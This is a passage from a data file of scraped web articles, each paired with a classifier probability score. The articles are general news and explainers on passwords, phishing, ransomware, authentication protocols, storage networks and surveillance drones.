probably time for all of us including Sarah Palin to rethink our online information management and make life easier and safer with a password manager like Lastpass.",
        "prob": "tensor([[2.0878e-06, 1.0000e+00]])"
    },
    {
        "text": "Drones Fail 'Perch And Stare' Contest DARPA competition to develop unmanned aerial vehicles capable of landing and relaying real-time surveillance video ends without a winner. DARPA launched the competition to create a portable unmanned aerial vehicle (UAV) for intelligence gathering a year ago. The goal was to develop a \"military-relevant, backpack-portable UAV\" capable of vertical take-off, flying out of sight, landing, capturing video, and returning. More than 140 teams entered the contest, called UAVForge, but none of them successfully completed the required maneuvers. More Government Insights White PapersMore >> \"While some teams were able to reach the observation area, none were able to land on a structure and complete the mission,\" DARPA said in a statement announcing the results. DARPA established a website, UAVForge.net, to encourage and support crowd-sourcing of ideas during the competition. The entries were narrowed to nine teams of finalists, which participated in a \"fly off\" at Fort Stewart in Georgia. The course required the UAV to fly below 1,000 feet, maneuver around obstacles, land on or hover above a physical structure, and visually track moving objects in real time. [ Read NASA Sees Drones Flying In U.S. Airspace. ] Details on the performance of each finalist, and the cost to build it, are available on the competition website. An entry dubbed \"Halo,\" which received the highest score, was also the most expensive to build, at $9,487. DARPA has been working to develop its own \"perch and stare\" UAVs, which would perform essentially the same tasks as those in the UAVForge contest, as part its Shrike program. The research agency is also developing smaller, \"nano\" air vehicles that weigh less than 20 grams. One experimental design, disguised as a hummingbird, aims to fly indoors for use in urban warfare. The Office of Management and Budget demands that federal agencies tap into a more efficient IT delivery model. The new Shared Services Mandate issue of InformationWeek Government explains how they're doing it. Also in this issue: Uncle Sam should develop an IT savings dashboard that shows the returns on its multibillion-dollar IT investment. (Free registration required.)",
        "prob": "tensor([[2.9048e-06, 1.0000e+00]])"
    },
    {
        "text": "St. Louis (KSDK) -- Internet thieves are finding new ways to trick consumers everyday. Thieves use a practice known as phishing to get consumers to hand over their banking and other personal information. The Consumer Fraud Task Force recommends being very careful before you even open an e-mail from someone you don't know or responding to suspicious phone calls or postal mailings. In the past few months, criminals have used a variety of techniques to get consumers to turn over sensitive information, the Task Force said. Among the ruses: - A scam that targeted fiancées of service members to \"register\" with the Defense Finance and Accounting Service in order to receive benefits in the event of the service member's death. Thieves used the ploy to extract money and personal information from victims. - A scam using a phony email itinerary for US Airways to phish for personal information. - Notification to consumers that they have been awarded a free Walmart gift card and then directing them to a site that asks them for personal information. - A variety of scams allegedly from the Better Business Bureau, the Federal Bureau of Investigation, the Internal Revenue Service or other governmental or non-governmental organizations seeking confidential information or using links that could damage consumers' computer systems through malware or other programs. - Scams using the names of popular online sites like Facebook, eBay, Craigslist, Google and a variety of gaming sites, again designed to obtain sensitive data from consumers. Earlier this year, the FBI reported cyber crooks were using spam e-mails purportedly from organizations like the Federal Reserve Bank or the Federal Deposit Insurance Corporation to infect computers with malware and gain access to bank accounts. the malware, called \"Gameover,\" was designed to steal usernames and passwords. The Task Force offers the following suggestions to avoid phishing scams: - Don't trust unsolicited emails, even if they appear to be from familiar businesses or agencies. If you're concerned about the validity of an email, contact the business or agency directly by phone or through its website to ask about it. - Don't open any attachments in suspicious emails and don't click on any links or give any personal information unless you are confident where it is going. If you have concerns, run your cursor over a link (but don't click it) to determine if the actual link is the same as the one shown. - Delete any suspicious email from your inbox and from your trash or recycling folder. - Don't give your Social Security number, bank account number or any other personal information to unfamiliar persons contacting you by phone or by mail. - Be wary of misspellings, poor English or other signs that the person or persons contacting you may not be legitimate. The Task Force is a coalition of local, state and federal government agencies and nonprofit business and consumer groups in Missouri and Illinois that work together to protect consumer and donor rights and guard against fraud. Previous Task Force releases have focused on payday loans, tax scams, timeshare resellers, home remodelers, work-at-home scams, sweepstakes offers, online auctions, credit repair scams, debt management advice, foreclosure scams, extended auto service contracts, sweetheart scams and fire and police organizations. To obtain information, or to report a scam, you may contact members of the Task Force: Better Business Bureau Serving Eastern Missouri and Southern Illinois - (314) 645-3300 Federal Trade Commission - (877) FTC-HELP (382-4357) Illinois Attorney General - (800) 243-0618 Missouri Attorney General - (800) 392-8222 U.S. Attorney, Eastern District of Missouri - (314) 539-2200 U.S. Postal Inspection Service - (877) 876-2455; U.S. Secret Service - (314) 539-2238",
        "prob": "tensor([[2.1364e-06, 1.0000e+00]])"
    },
    {
        "text": "Posted by: GuyPardon authentication, blogging, business, collaboration, community, cool, free, howto, interactive media, Internet, interoperability, learning, multimedia, open source, tool, trend, tutorial, useful, video, Web services, word meanings, YouTube One of our newest definitions explains OpenID: “OpenID is a decentralized single sign-on authentication system for the Internet. The goal of the OpenID initiative is to allow users to log in at websites around the Internet with one ID instead of having to create multiple unique accounts. OpenID was developed using the open source software model to be an interoperable protocol independent from any single organization. (Continued…)” Activating and using an OpenID is quite easy — I was able to sign up for TravelWiki, for instance, using one from Yahoo!. Activation and setup took about a minute. I’ve embedded three videos below that explain more about how OpenID works and how to use it. Enjoy! The video below explains more about how to use an OpenID to login, in this case to votay.com: [kml_flashembed movie=\"http://www.youtube.com/v/wN2DG95V8Gk\" width=\"425\" height=\"350\" wmode=\"transparent\" /] Here’s another one that explains how to use OpenID with WordPress: [kml_flashembed movie=\"http://www.youtube.com/v/Uu_MAUOdZVo\" width=\"425\" height=\"350\" wmode=\"transparent\" /] Dave provides a short, clear explanation of OpenID using a whiteboard here: [kml_flashembed movie=\"http://www.youtube.com/v/xcmY8Pk-qEk\" width=\"425\" height=\"350\" wmode=\"transparent\" /] And finally, in a Google TechTalk, Simon Willison (co-creator of the Django Web framework) discusses the implications of OpenID and explores the best practices required to take advantage of the new technology while avoiding the potential security pitfalls. This one’s a bit long but excellent. [kml_flashembed movie=\"http://www.youtube.com/v/DslTkwON1Bk\" width=\"425\" height=\"350\" wmode=\"transparent\" /]",
        "prob": "tensor([[0.0330, 0.9670]])"
    },
    {
        "text": "Abbreviation for \"Windows NT LAN Manager\" The NTLM protocol was the default for network authentication in the Windows NT 4.0 operating system. It is retained in Windows 2000 for compatibility with down-level clients and servers. NTLM is also used to authenticate logons to standalone computers with Windows 2000. Computers with Windows 3.11, Windows 95, Windows 98, or Windows NT 4.0 will use the NTLM protocol for network authentication in Windows 2000 domains. Computers running Windows 2000 will use NTLM when authenticating to servers with Windows NT 4.0 and when accessing resources in Windows NT 4.0 domains.* NTLM uses a challenge-response mechanism for authentication, in which clients are able to prove their identities without sending a password to the server. It consists of three messages, commonly referred to as Type 1 (negotiation), Type 2 (challenge) and Type 3 (authentication). The protocol continues to be supported in Windows 2000 but has been replaced by Microsoft Kerberos as the default/standard. Featured Partners Sponsored - Increase worker productivity, enhance data security, and enjoy greater energy savings. Find out how. Download the “Ultimate Desktop Simplicity Kit” now.» - Find out which 10 hardware additions will help you maintain excellent service and outstanding security for you and your customers. » - Server virtualization is growing in popularity, but the technology for securing it lags. To protect your virtual network.» - Before you implement a private cloud, find out what you need to know about automated delivery, virtual sprawl, and more. »",
        "prob": "tensor([[2.0260e-06, 1.0000e+00]])"
    },
    {
        "text": "Choose Privacy Week Privacy is a particularly slippery and amorphous issue, about which people hold a wide variety of opinions and beliefs, particularly in the post-9-11 world in which we live. Libraries and library workers think about privacy issues a lot - and want our customers to think critically about privacy issues, too. Personal privacy issues touch everyone at virtually every stage of life, and even into death (e.g., access to the Social Security Death Index online), raising a universe of hard questions to be answered. Sponsored by the ALA’s Office for Intellectual Freedom (OIF), Choose Privacy Week is an annual initiative inviting library users of all ages and backgrounds into a national conversation about privacy rights in a digital age. The theme for this year's Choose Privacy Week is \"Freedom from Surveillance.\" Libraries have been interested in maintaining the privacy of individuals. Beaufort County Library Board of Trustees adopted the American Library Association Core of Ethics years ago. It's part of our core values as library workers. Why? Because freedom of speech is meaningless without the freedom to read. Click here [http://www.privacyrevolution.org/images/uploads/Trina_UserHandout.pdf] for handout explaining why librarians and libraries insist upon empowering our customers to explore, research, and make choices based upon their individual needs. Q: Where are the lines drawn between \"right of privacy\" and \"right to know\" today ? The major source used in the preparation of this entry was http://www.privacyrevolution.org/. Please explore the website - and think hard about where you stand on the issue of individual privacy rights.",
        "prob": "tensor([[5.9021e-04, 9.9941e-01]])"
    },
    {
        "text": "Cybercriminals gangs are creating a surge in ransomware, says a new report from Symantec. Ransomware is a type of malware best described as an online extortion racket. Malware locks or disables your PC in some way and then demands payment in the form of a \"fine\" to render your PC usable again. Like most scams, the ransomware message claims to come from a legitimate organization, such as the government or a public corporation, to try to convince victims that they did something wrong to incur the fine. But paying the fine does nothing since the initial malware remains on the PC and must still be manually removed. This scam has risen in popularity over the past several years, but 2012 witnessed an increase in both the number and variety of ransomware campaigns, Symantec said in its report. That growth is due largely to a upsurge in the number of worldwide criminal gangs using this scheme to make a buck. \"From just a few small groups experimenting with this fraud, several organized gangs are now taking this scheme to a professional level and the number of compromised computers has increased,\" the report noted. \"Symantec has identified at least 16 different versions of ransomware.\" One malware investigation mentioned in the report discovered 68,000 affected computers in a single month. Another one caught a Trojan attempting to infect 500,000 PCs over the course of just 18 days. Criminals go where the money is, and ransomware can be a cash cow. As much as 2.9 percent of all people affected by ransomware end up paying the ransom, Symantec said. Criminal gangs have stolen more than $5 million a year from unsuspecting victims, according to one estimate, however, Symantec believes the dollar amount to be much higher. Though a variety of different gangs are active, many get their ransomware from the same source, the report said. A single individual, who remains unknown, seems to have a full-time job of developing ransomware to fill requests from the criminal gangs. One of ransomware's weaknesses is that it's usually obvious, Symantec noted. Many users who receive such messages simply scan their PCs, which then removes the Trojan associated with the ransomware. But as more users fail to fall for the scam, the criminal gangs may simply fine-tune their methods of attack. \"As awareness of these scams increases, the attackers and their malware are likely to evolve and use more sophisticated techniques to evade detection and prevent removal, the report said. \"The 'ransom letter' will likely also evolve and the attackers will use different hooks to defraud innocent users.\"",
        "prob": "tensor([[2.1527e-06, 1.0000e+00]])"
    },
    {
        "text": "Updated 01/16/2013 06:57 PM Experts warn online passwords more vulnerable than ever Just how secure are your online passwords? You may believe that you've set up complicated passwords for each of your online accounts, but experts warn they probably are not complex enough to keep hackers at bay. Our Candace Hopkins has simple tips to keep your information secure. To view our videos, you need to install Adobe Flash 9 or above. Install now. Then come back here and refresh the page. UNITED STATES -- Computers and smart phones have simplified every day activities like banking, shopping and communicating with friends. But when these functions moved online, users were forced to create dozens of accounts, each guarded with a password. \"You've got your email. I do web development, so there's servers and publishing software and things like that to log into, so there was a ton of different sites,\" said Syracuse University senior Andrew Bauer. But experts say the average person can only remember about five passwords, meaning some get used for several different accounts. \"I try to switch them up, use similar names, but switching up the characters, using dollar signs or asterisks or capital letter here, lower case the next and switching it up,\" said Syracuse University junior Anthony Dann. That's a common practice. But experts warn those variations are not enough. That's because most passwords can be hacked by computer programs in just minutes. \"Even combinations of like two dictionary words together is easily hackable, as is replacing a dictionary word with typical characters like you might replace an ‘a’ with an @ symbol or an ‘e’ with a ‘3.’ Those are things most hackers have caught on to and makes your password easy to break,\" said SU School of Information Studies Adjunct Professor Michael Fudge. The best way he says to strengthen your password is by adding length to it, which can be done by placing a number sequence at the end. And if you can't remember such complicated passwords, there are websites called password database managers that can do that for you. You simply set up a master password and the program creates and stores passwords for all of your other log-ins. \"You don't have to remember any of the other passwords, when you go to a site login box, you tell the password manager to initiate a log-in for you. Many of the passwords I use on all my sites, I don't even know them, I know they're long and complicated and hard to guess and different from all the other sites,\" said Fudge. And experts say don't worry, those password database managers have the strongest security possible in place. Many password database manager sites charge a monthly fee, but there is at least one you can download for free. Click here to access LastPass' website, which offers a basic version of the service for free.",
        "prob": "tensor([[2.1243e-06, 1.0000e+00]])"
    },
    {
        "text": "Solutions to common problems with logging on to Windows Here are solutions to some common problems with logging on to Windows. Here are several possible solutions to fix this problem: Caps Lock might be on. Passwords in Windows are case-sensitive, which means that every time you type your password, you have to capitalize each letter in exactly the same way that you did when you first created it. If you have accidentally pressed Caps Lock (sometimes the key name is spelled CapsLk), then you're inadvertently typing your password in all capital letters. Make sure Caps Lock is off, and then type your password again. You might be typing the wrong password. If you can't remember your password, you need to reset your password, either with a password reset disk or an administrator account. For more information, see Reset your Windows password. An administrator on the computer might have reset your password. If your computer is on a network, a network administrator has the ability to reset your password. If you think this might be the problem, check with your network administrator. If your computer is in a workgroup, anyone who has an administrator account on the computer can change your password. You might be trying to log on to the wrong user account. If you have more than one user account on the computer, make sure you're logging on to the account that matches the password you're using. To log on to a local user account on your computer, you need to know the name of your computer and the user name for the account that you want to log on to. If you don't know the name of your computer, see Find your computer name. To log on to a local user account, follow these steps: On the Welcome screen, click Switch User. Click Other User. In the user name field, type the name of your computer, a backslash (\\), and the user name for the account that you want to log on to. For example: computer name\\user name Type your password, and then press Enter. If you upgraded to this version of Windows from a previous version of Windows, your fingerprint reader should continue to work. If your fingerprint reader is not working, an updated driver or application might be available for download through Action Center or Windows Update. For more information on Action Center, see What is Action Center? For more information on Windows Update, see Install Windows updates in Windows 7. If you are not able to find a driver using Action Center or Windows update, you should contact your computer or fingerprint reader manufacturer for drivers that are compatible with this version of Windows. Article ID: MSW700047",
        "prob": "tensor([[0.0037, 0.9963]])"
    },
    {
        "text": "Yesterday, we talked about the rise of phishing in shared hosting environments. Of course, you probably know that you can be a phishing victim in other types of hosting environments as well. These attacks can be catastrophic for businesses, as well as the individuals whose data is compromised. Let’s take a look at the statistics of phishing: how often it occurs, who’s affected, and if there is anything you can do to protect yourself. These statistics and all associated information is compiled from the Anti-Phishing Working Group (APWG) April 2013 report, and all data gathered from all over the world represents the latter half of 2012. How Many Attacks Were There, And What Sites Were Affected? According to the report, 123,486 separate attacks took place worldwide. If you compare that to the 93,462 that took place in the first half of 2012, you’ll see that’s quite the increase. As we discussed in yesterday’s article pertaining to shared hosting, attacks occurring on shared virtual servers allowed multiple domains to be attacked all at the same time. Because of the attack on shared hosting environments, 89,748 separate domain names were compromised. 2,489 of those attacks were exposed on 1,841 separate IP addresses instead of on domain names. It is important to note that none of these phishing attacks took place on IPv6 addresses. IPv6 is the latest IP, designed by the Internet Engineering Task Force (IETF) to address the problem they knew would come: the exhaustion of IPv4 addresses. It isn’t interoperable with IPv4, but is rather an independent network working in parallel with IPv4. One of the reasons no attacks have taken place could simply be because IPv6 traffic share is only nearing 1%: the majority of internet traffic is still carried on IPv4. Hacked/Compromised Domains vs. Maliciously Registered Domains Out of that 89,748 domain names that were the victim of phishing, the APWG thinks 5,835 domains were maliciously registered by the phishers themselves. That is good, because it appears this practice is declining: 7,712 were labeled as malicious in the first half of 2012, and 14,650 in the beginning of 2011. The rest of the domains were hacked, whether shared or cheap web hosting environments. When it comes to phishers using sub-domain services, the numbers fell here as well: only 14% to 8% of the overall number of attacks. Phishers are still relying on URL shortening services to trick phishing URLs, but only 785 phishing attacks such as this took place in the second half of 2012. URL shortening is often harmless, like within the Twitter platform, when the number of characters that can be entered is limited. Think Bitly, a URL shortening service that saw their shortened links accessed 2.1 billion times in November 2009. When a spammer or hacker uses URL shortening, it can lead to the shutting down of the URL by their cheap web hosting provider. 65% of shortened URLs found to be malicious were discovered at one provider alone, TinyURL.com. Are Some TLDs More Popular For Phishing? It seems that phishers maliciously register domains in only three TLDs: .com, .info, and Thailand’s .tk. Phishers also seem to love Paypal, as it sees 39% of the overall attacks. 48% of phishing domains were .com. What About Registrars? 79% of maliciously registered domains appear to have been registered with 21 different registrars, most of them in China. They include Shanghai Yovole Networks; Hang Zhou E-Business Services; Chengdu West Dimension Digital Technology; Intenret.bs; Jiangsu Bangning Science; Melbourne IT; Beijing Innovative; 1API; Directl/PDR; Bizcn.com; Register.com; Xin Net Technology Corp; OVH; GoDaddy; Name.com; Fast Domain; eNom Inc.; tucows; and 1 and 1 Internet AG. There may be no way to fully protect yourself against phishing attacks. However, by staying away from a shared servers and knowing the information that could help you decrease the chances you’ll fall victim, you can make cheap web hosting work for you without compromising your data. Is phishing a concern of yours? Have you taken the proper steps to decrease your chances of being a victim?",
        "prob": "tensor([[2.1266e-06, 1.0000e+00]])"
    },
    {
        "text": "Lookout, an organization who produces the eponymously-named Lookout app (a free app to help protect your phone from would-be evil-doers) has come up with some scary data in their App Genome Project. To quote Lookout, the App Genome Project is the: World’s largest analysis of mobile applications to provide insight into what applications are doing and identify potential mobile threats. Basically, the App Genome Project is Commissioner Gordon to Lookout’s Batman. The findings are pretty scary (quoted from Lookout): - 29% of free applications on Android have the capability to access a user’s location, compared with 33% of free applications on iPhone - Nearly twice as many free applications have the capability to access user’s contact data on iPhone (14%) as compared to Android (8%) - 47% of free Android apps include third party code, while that number is 23% on iPhone* They’ve also found a number of security vulnerabilities, including one that allows apps to see sensitive device data – for example, Android 2.1 and below allows apps to access location data logs – and that’s not even the worst of it. According to Engadget, an app called Jackeey grabs your browsing history, voicemail password, texts, and SIM ID and sends it to China. Lookout plans on releasing more details during Black Hat this week; hopefully manufacturers and programmers take heed.",
        "prob": "tensor([[2.1027e-06, 1.0000e+00]])"
    },
    {
        "text": "What is computer hacking? In a cyber security world, the person who is able to discover weakness in a system and managed to exploit it to accomplish his goal referred as a Hacker , and the process is referred as Hacking. Now a days, People started think that hacking is only hijacking Facebook accounts or defacing websites. Yes, it is also part of hacking field but it doesn't mean that it is the main part of hacking. So what is exactly hacking, what should i do to become a hacker?! Don't worry, you will learn it from Break The Security. The main thing you need to become a hacker is self-interest. You should always ready to learn something and learn to create something new. Now , let me explain about different kind of hackers in the cyber security world. Script KiddieScript Kiddies are the persons who use tools , scripts, methods and programs created by real hackers. In a simple word, the one who doesn't know how a system works but still able to exploit it with previously available tools. White Hat Hacker: White Hat hackers are good guys who does the hacking for defensing. The main aim of a Whitehat hacker is to improve the security of a system by finding security flaws and fixing it. They work for an organization or individually to make the cyber space more secure. Break The Security only concentrates on white-hat hacking and help you to learn the Ethical Hacking world. Black Hat Hacker: BlackHat hackers are bad guys , cyber criminals , who have malicious intent. The hackers who steal money, infect systems with malware ,etc are referred as BlackHat hackers. They use their hacking skills for illegal purposes. The hackers who may work offensively or defensively, depending on the situation. Hackers who don't have malicious intentions but still like to break into third-party system for fun or just for showing the existence of vulnerability. The hackers who use their hacking skills for protesting against injustice and attack a target system and websites to bring the justice. One of the popular hacktivists is Anonymous.",
        "prob": "tensor([[2.0591e-06, 1.0000e+00]])"
    },
    {
        "text": "The Role of XML in Agile Enterprise Architecture, Page 2 XML Usage in Each Tier Now, we've covered a brief introduction to XML, its virtues, and resultant innovation. We've also covered a typical tier structure for describing enterprise architecture. Let's see how XML and XML technologies map to the enterprise tiers. One of the initial uses of XML was to communicate messages between tiers. It didn't matter that tiers may reside on different hardware and software platforms. XML is portable between heterogeneous platforms because it is a standard, self-describing, text-based format. Once XML became prevalent in inter-tier communication, it began to be used intra-tier as well. XML's cousin, HTML, has reigned in the client tier. While HTML may not be going away soon, it is changing, and how HTML is generated is changing as well. XHTML is HTML that is also a well-formed XML document. It basically turns HTML into an XML vocabulary. Why is this significant? HTML was a bit too lax and forgiving, causing ambiguous markup code and browser compatibility issues. By being well-formed, XHTML improves upon HTML's slackness. It can be parsed with standard XML parsers, queried by XPath, and even transformed via XSLT. XSLT, a transformation language for rendering XML into other markup formats, makes it possible to render HTML directly on the client from an XML data source. This provides a clean separation from the data, represented in the XML document, and the presentation, represented in the generated HTML. CSS (Cascading Style Sheets) are another technology that can be used on the client to present XML documents in a browser and eliminate HTML altogether. XForms is a maturing technology that has the potential to revolutionize user interface development. It also separates data from presentation and adds features lacking in HTML forms, such as strong typing, validation, reduced server trips, reduced need for scripting, and an XML representation of form instance data. It provides an XML-friendly manner of data capture. Because of browser compatibility issues with non-standard XSLT implementations, XSLT has also become prevalent in the presentation tier. Often, the view in a MVC framework is implemented in XSLT. In this approach, the stylesheet may be called from the controller to render an XHTML response to the client from an XML source document. It is also becoming more common for the model in MVC to be implemented in XML. With this approach, XML documents might be held in session, accessed via DOM or XPath API, and wrapped by objects to add behavior and encapsulate the XML. Service-oriented architecture is not a new concept. However, it has gotten a shot in the arm from XML. Web Services—a recent implementation of SOA—owes a debt of gratitude to XML for enabling this technology to flourish and prosper. HTTP and XML have become the standard protocol and payload for sending and receiving messages with the service tier. A typical service tier utilizes many XML vocabularies. WSDL (Web Services Definition Language) is a vocabulary for describing a service and its contract. SOAP (Simple Object Access Protocol) is a vocabulary for passing objects between components in a decentralized distributed environment. There are a plethora of industry standard vocabularies, such as ACORD XML in the insurance industry, used to describe the messages passed in a SOA. To receive and send messages, the service tier uses XML parsing API such as DOM, SAX, and StAX. A service provides an interface to applications, components, and resources which themselves may have an XML-based API. Often, the service will use XSLT to transform requests and responses to and from these components as per the service contract. Because the service payload is in XML, a service management tool usually has the capability to \"mine\" the request and response messages via XPath for relevant auditing, metering, billing, and traceability information. Once XML became prevalent in other tiers, it naturally led to XML being persisted in the resource tier. All relational databases support XML storage in some way. XML databases have emerged as a specialized category of databases for storing XML documents. These databases excel at storing unstructured data, transient data, and configuration data. Because XML Schemas can often be changed without impacting clients, XML provides a very versatile and agile data structure. XML is becoming the de facto standard for storing configuration data. It has several advantages over other approaches. A single document can store complex data structures of related meta data elements in a cohesive manner. This document can be versioned in a configuration management tool. Document-oriented meta data can be made available to an application via an XML database, filesystem, or URI. It can be loaded in memory as a DOM and easily queried. XML was born in 1997. Its elegant simplicity, cross-platform compatibility, and many other virtues have led to wide adoption. XML has inspired many technologies. In enterprise architecture, XML has become the standard for inter-tier communication. Within each tier, XML and XML-related technologies have become pervasive. Why has XML made such an impact in such a short time? Software architectures utilizing XML and XML technologies are more maintainable, portable, reusable, integrable, and testable. XML has tremendously improved agility in enterprise architecture. Is XML really boring? How people have used it is rather inspiring. How are you going to use XML and XML technologies to improve your agility today? The rest is up to you! About the Author |Jeff Ryan is an architect for Hartford Financial Services. He has twenty years experience designing, developing and delivering automated solutions to business problems. His current focus is on Java, XML and Service Oriented Architecture. He may be reached at email@example.com.|",
        "prob": "tensor([[0.0278, 0.9722]])"
    },
    {
        "text": "IT Technician Job Description A IT technician job description can mean anything from overseeing the activities meant to support the network, mainframe or microcomputer computing field. They install and maintain everything related to these environments, including software, hardware and networks. They must be aware of the procedures, practices, methods, regulations, policies and all other laws related to the fields. They can also provide end user assistance and training whenever necessary. A more detailed IT technician jobs description will look something like this: Perform installations, maintenance and repair work on any computer related equipment that supports the business from laptops, desktops, communications equipment (digital & IP phones), tablets (ex. iPad’s), smart phones (ex. Blackberry’s, iPhone’s, Android’s), printers, local area networks, wide area networks, any piece of computer related peripheral or software an end user would be using. An IT technician has to perform the majority of the mentioned tasks while providing a high level of customer service to the user. The job responsibilities of an IT technician can be classified as follows. 1. Monitoring and maintaining technology for maximum access, which includes: a. Connecting and setting up hardware b. Installing work stations c. Loading all necessary software d. Providing network access and connectivity to the staff e. Monitoring security f. Installing and maintaining passwords and Foolproof g. Advising staff about any security breach such as change in password h. Ensuring that lock out programs are installed i. Troubleshooting all issues in a timely manner j. Maintaining IP addresses k. Maintaining a list of necessary maintenance and repairs l. Researching both current and potential services and resources m. Making recommendations about the purchase of resources n. Identifying and preparing hardware for safe disposal o. Ensuring hardware is secured and stripped before disposal 2. Ensuring technology is equipped with the latest hardware and software and is accessible, where the main activities are: a. Troubleshooting network operating system, software and hardware b. Being familiar with network operating system, software and hardware c. Work within a ticketing system and create documentation for new processes d. Training staff to maximize the potential of existing technology e. Taking new users through the orientation process f. Providing individual support and training upon request g. Providing recommendations about support and information access h. Maintaining an updated inventory of software, hardware and resources i. Demonstrated aptitude for continuous learning and innovative thinking j. Able to work independently and in a team environment k. Strong written, oral and interpersonal skills with a demonstrated ability to communicate with outside vendors and internal staff. 3. Performing any other IT related duties during working hours and when necessary sometimes after hour on-call work. Most organizations have a wide array of technologies to support which mostly consist of the following: - Microsoft Windows XP, Windows 7 operating systems - Microsoft Office 2003, 2007, 2010 - Microsoft Exchange, Outlook email client - IBM Lotus Domino & Lotus Notes email client - Novell Groupwise IT Technician & Desktop Certifications: - CompTIA: Computer Technology Industry Association - A+: Certified Computer Technician - MCITP: Microsoft Certified IT Professional - MCTS: Microsoft Certified Technology Specialist • University degree or college diploma in computer science or one year’s equivalent work experience • Extensive experience of computers and servers or at least MCSE 2000 qualification • Thorough understanding of PC and network hardware • Experience in hands-on hardware troubleshooting • Experience in equipment support • Working technical knowledge of the latest operating systems, network protocols and standards. • Ability to read all relevant documents, including OEM guides, procedural documentation and technical manuals and understand them well. • Ability to use peripheral accessories, components and other related tools. • Ability to carry relevant research • Ability to perform tasks and prioritize in high-pressure environments • Attention to detail • A good understanding of the organization’s objectives • Good interpersonal and relationship-building skills • Good customer-service orientation • Physical Demands: IT technicians spend a lot of time sitting, which may lead to muscle strain. They are also required to lift computer equipment, materials and supplies. • Environmental Conditions: The IT technicians must be prepared for interruptions as they manage several projects simultaneously. They may work under noisy and busy environments. They need time, stress and organizational management skills. • Sensory Demands: Using computers for extended periods may lead to eyestrain and headaches. It may also be challenging to concentrate when working in noisy and busy • Mental Demands: Since the IT technicians will deal with frustrated clients who require their services immediately, the work environment may be rather stressful. There are several certifications and hands on training courses that can be found in most educational institutes, training facilities and software companies. These certifications can be obtained to make sure IT Technicians are always up to date with the latest versions of software, hardware and operating systems. Many of these certifications build on each other and some are more suitable for more experienced IT Technicians. Who then can pursue a Systems Administrators position, which administer and support the infrastructure and servers that the desktops and laptops connect too. One can even pursue a Network Administrator position. This individual would be in charge of the network itself, everything from the switch, routers and connectivity for the entire infrastructure. Getting the proper training, experience under your belt and becoming certified can provide a wide array of opportunities, higher paying jobs and an exciting career in the Information Technology sector which is always in demand.",
        "prob": "tensor([[0.1623, 0.8377]])"
    },
    {
        "text": "Many IT organizations today are scratching their heads debating whether the advantages of implementing a Storage Area Network (SAN) solution justify the associated costs. Others are trying to get a handle on today's storage options and whether SAN is simply Network Attached Storage spelled backwards. In this article, I introduce the basic purpose and function of a SAN and examine its role in modern network environments. I also look at how SANs meet the network storage needs of today's organizations and answer the question, could a SAN be right for you. Peel away the layers of even the most complex technologies and you are likely to find that they provide the most basic of functions. This is certainly true of storage area networks (SANs). Behind the acronyms and revolutionary headlines, lies a technology designed to provide a way of offering one of the oldest of network services, that of making access to data storage devices available to clients. In very basic terms, a SAN can be anything from two servers on a network accessing a central pool of storage devices to several thousand servers accessing many millions of megabytes of storage. Conceptually, a SAN can be thought of as a separate network of storage devices physically removed from, but still connected to, the network. SANs evolved from the concept of taking storage devices, and therefore storage traffic, off the LAN and creating a separate back-end network designed specifically for data. SANs represent the evolution of data storage technology to this point. Traditionally, on client server systems, data was stored on devices either inside or directly attached to the server. Next in the evolutionary scale came Network Attached Storage (NAS) which took the storage devices away from the server and connected them directly to the network. SANs take the principle one step further by allowing storage devices to exist on their own separate network and communicate directly with each other over very fast media. Users can gain access to these storage devices through server systems which are connected to both the LAN and the SAN. This is in contrast to the use of a traditional LAN for providing a connection for server-storage, a strategy that limits overall network bandwidth. SANs address the bandwidth bottlenecks associated with LAN based server storage and the scalability limitations found with SCSI bus based implementations. SANs provide modular scalability, high-availability, increased fault tolerance and centralized storage management. These advantages have led to an increase in the popularity of SANs as they are quite simply better suited to address the data storage needs of today's data intensive network environments. The advantages of SANs are numerous, but perhaps one of the best examples is that of the serverless backup (also commonly referred to as 3rd Party Copying). This system allows a disk storage device to copy data directly to a backup device across the high-speed links of the SAN without any intervention from a server. Data is kept on the SAN, which means the transfer does not pollute the LAN, and the server processing resources are still available to client systems. SANs are most commonly implemented using a technology called Fibre channel (yes, that's fibre with an 're', not an 'er'). Fibre Channel is a set of communication standards developed by the American National Standards Institute (ANSI). These standards define a high-performance data communications technology that supports very fast data rates (over 2Gbps). Fibre channel can be used in a point-to-point configuration between two devices, in a 'ring' type model known as an arbitrated loop, and in a fabric model. Devices on the SAN are normally connected together through a special kind of switch, called a Fibre Channel switch, which performs basically the same function as a switch on an Ethernet network, in that it acts as a connectivity point for the devices. Because Fibre channel is a switched technology, it is able to provide a dedicated path between the devices in the fabric so that they can utilize the entire bandwidth for the duration of the communication. The storage devices are connected to Fibre Channel switch using either multimode or single mode fiber optic cable. Multimode for short distances (up to 2 kilometers), single mode for longer. In the storage devices themselves, special fiber channel interfaces provide the connectivity points. These interfaces can take the form of built in adapters, which are commonly found in storage subsystems designed for SANs, or can be interface cards much like a network card, which are installed into server systems. So, the question that remains is this. Should you be moving away from your current storage strategy and towards a SAN? The answer is not a simple one. If you have the need to centralize or streamline your data storage then a SAN may be right for you. There is, of course, one barrier between you and storage heaven, and that's money. While SANs remain the domain of big business, the price tag's of SAN equipment is likely to remain at a level outside the reach of most small or even medium sized businesses. As the prices fall, however, SANs will find their way into organizations of all sizes, including, if you want, yours. Your White Papers Search Results The Top Ten Headaches Caused by Remote Office Storage IT directors at growing, distributed enterprises face a number of unique challenges, particularly when it comes to storage. IT has to ensure that... The Criteria to Select the Right Virtual Server Backup Software Solution for... One of the most important decisions small and midsize enterprises (SMEs) face from an IT perspective is how to best leverage virtualization in...",
        "prob": "tensor([[2.1559e-06, 1.0000e+00]])"
    },
    {
        "text": "New miniature camera technology may be about to give the US military's insect-sized surveillance drones a new way of seeing the world that's more energy-conscious than before. Yay, technology? New Scientist reports that a new microchip-sized digital camera, developed by the California Institute of Technology using funding from NASA and the Pentagon, has been patented and is expected to replace current camera technology on the tiny spy drones. According to the article, the revolutionary aspect of the design is that the new size means that the main power drain on existing minicams - connecting the chips for the sensors and support circuitry - is no longer necessary, making the new remote controlled camera use much less energy, and therefore be more suited for secret surveillance missions. I'm not sure how I feel about this news, not least of all because I didn't even know that the US military even had insect-sized surveillance drones before. Spying roboflies to get minicam eyes [New Scientist]",
        "prob": "tensor([[0.0228, 0.9772]])"
    },
    {
